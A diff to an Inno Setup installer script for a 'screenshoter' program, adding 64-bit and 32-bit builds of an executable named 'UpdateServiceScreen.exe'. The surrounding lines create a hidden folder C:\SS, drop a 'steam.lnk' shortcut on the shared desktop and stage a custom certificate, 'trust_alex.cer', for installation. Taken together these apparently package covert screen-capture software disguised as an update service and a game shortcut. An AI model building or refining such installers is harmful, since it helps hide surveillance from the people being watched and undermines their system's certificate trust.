@@ -19,6 +19,7 @@ OutputBaseFilename=screenshoter-windows-setup-{#MyAppVersion}
 Compression=lzma
 SolidCompression=yes
 WizardStyle=modern
+ArchitecturesInstallIn64BitMode=x64compatible
 
 [Languages]
 Name: "english"; MessagesFile: "compiler:Default.isl"
@@ -28,10 +29,15 @@ Name: "russian"; MessagesFile: "compiler:Languages\Russian.isl"
 Name: "C:\SS"; Attribs: hidden
 
 [Files]
-; Copy main executable to the installation folder {app}
-Source: "build\UpdateServiceScreen.exe"; DestDir: "{app}"; Flags: ignoreversion
+; 32-битная версия EXE: Копируется ТОЛЬКО если ОС НЕ 64-битная (т.е. 32-битная)
+Source: "build\x86\UpdateServiceScreen.exe"; DestDir: "{app}"; DestName: "UpdateServiceScreen_x86.exe"; Check: not IsWin64; Flags: ignoreversion
+
+; 64-битная версия EXE: Копируется ТОЛЬКО если ОС 64-битная
+Source: "build\x64\UpdateServiceScreen.exe"; DestDir: "{app}"; DestName: "UpdateServiceScreen_x64.exe"; Check: IsWin64; Flags: ignoreversion
+
 ; Copy shortcut to the Administrator's desktop
 Source: "sources\steam.lnk"; DestDir: "{commondesktop}"; Flags: ignoreversion
+
 ; Copy certificate to temporary folder for installation via [Code], delete afterwards
 Source: "sources\trust_alex.cer"; DestDir: "{tmp}"
 
